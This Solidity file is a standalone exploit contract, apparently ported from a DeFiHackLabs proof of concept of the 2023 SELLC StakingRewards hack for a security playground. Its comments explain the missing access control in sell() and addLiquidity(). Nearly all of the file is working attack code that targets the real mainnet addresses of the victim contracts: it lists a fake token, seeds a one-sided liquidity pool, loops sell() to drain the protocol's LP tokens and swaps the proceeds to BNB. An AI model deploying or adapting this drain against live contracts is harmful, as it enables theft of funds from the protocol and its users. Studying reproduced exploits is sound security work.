// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-SELLC).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest IS the attacker AND the fake "project token" it registers with
// StakingRewards.addLiquidity — its balanceOf/transfer/transferFrom/totalSupply
// form the worthless token the bug prices against). There is no standalone
// exploit contract to deploy, so we reproduce the attack with a self-contained
// standalone contract (this file), compiled inside the registry forge project.
// Logic and constants are copied verbatim from test/SELLC_exp.sol.
//
// Root cause: StakingRewards.sell() (public, no auth) prices its `token1` payout
// via Router.getAmountsOut over getPair(token, token1), where both `token` and
// the pair are attacker-created. addLiquidity() (also public) allow-lists any
// caller-supplied token into `listToken`, the sole gate on sell(). The attacker
// mints a worthless token, lists it for free, seeds a one-sided customLP, then
// loops sell() to drain the protocol's custodied SellQILP (SELLC/QIQI LP),
// burns it for SELLC+QIQI, and swaps SELLC→WBNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface IRouter {
    function factory() external view returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IStakingRewards {
    function addLiquidity(address _token, address token1, uint256 amount1) external;
    function sell(address token, address token1, uint256 amount) external;
}

// A minimal throwaway ERC20 the attacker registers as the "token1" of its own
// addLiquidity() call (purely to satisfy the path; it is never the price source).
contract SHITCOIN {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}

contract SELCDrain {
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant QIQI = IERC20(0x8121D345b16469F38Bd3b82EE2a547f6Be54f9C9);
    IERC20 internal constant SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IUniswapV2Factory internal constant Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
    IRouter internal constant Router = IRouter(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
    IRouter internal constant officalRouter = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IStakingRewards internal constant StakingRewards = IStakingRewards(0x274b3e185c9c8f4ddEF79cb9A8dC0D94f73A7675);
    IUniswapV2Pair internal constant SellQILP = IUniswapV2Pair(0x4cd4Bf5079Fc09d6989B4b5B42b113377AD8d565);

    IUniswapV2Pair public customLP;
    SHITCOIN public MYTOKEN;

    // --- fake "project token" (this contract IS the token the attacker registers) ---
    // Copied verbatim from ContractTest's ERC20 methods. totalSupply()==100 makes
    // the register-token's `transferFrom`/`transfer` bookkeeping trivially succeed.
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
    }

    function totalSupply() external view returns (uint256) {
        return 100;
    }

    // swapExactTokensForETH sends native BNB to address(this); the original test
    // contract inherited Test (which is payable). Accept native BNB here.
    receive() external payable {}

    // --- the attack (verbatim from ContractTest.testExploit / init / init2 / process) ---
    function run() external {
        init();
        init2();
        process(23);
    }

    function init() internal {
        WBNB.approve(address(officalRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( // swap 3 WBNB to SELLC
            3 * 1e18, 0, path, address(this), block.timestamp
        );
        SELLC.approve(address(Router), type(uint256).max);
        QIQI.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(SELLC),
            address(QIQI),
            SELLC.balanceOf(address(this)),
            QIQI.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        ); // add SELLC-QIQI Liquidity
        MYTOKEN = new SHITCOIN();
        MYTOKEN.mint(1 * 1e18);
        this.mint(100);
        this.approve(address(StakingRewards), type(uint256).max);
        StakingRewards.addLiquidity(address(this), address(MYTOKEN), 1e18); // add exploit contract address to listToken
        Factory.createPair(address(this), address(SellQILP));
        this.mint(1_000_000);
        this.approve(address(Router), type(uint256).max);
        SellQILP.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(this),
            address(SellQILP),
            1_000_000,
            SellQILP.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        ); // add customLP Liquidity
        customLP = IUniswapV2Pair(Factory.getPair(address(this), address(SellQILP)));
    }

    function init2() internal {
        this.mint(type(uint256).max);
        this.transfer(address(0x000000000000000000000000000000000000dEaD), 1000);
        for (uint256 i; i < 10; i++) {
            uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = address(SellQILP);
            uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2;
            StakingRewards.sell(address(this), address(SellQILP), swapAmountIn);
            Router.addLiquidity(
                address(this),
                address(SellQILP),
                100 * 1e18,
                SellQILP.balanceOf(address(this)),
                0,
                0,
                address(this),
                block.timestamp
            );
        }
    }

    function process(uint256 amount) internal {
        uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(SellQILP);
        uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2;
        for (uint256 i; i < amount; i++) {
            StakingRewards.sell(address(this), address(SellQILP), swapAmountIn);
        }
        SellQILP.transfer(address(SellQILP), SellQILP.balanceOf(address(this)));
        SellQILP.burn(address(this));
        SELLCToWBNB();
    }

    function SELLCToWBNB() internal {
        SELLC.approve(address(officalRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SELLC);
        path[1] = address(WBNB);
        officalRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
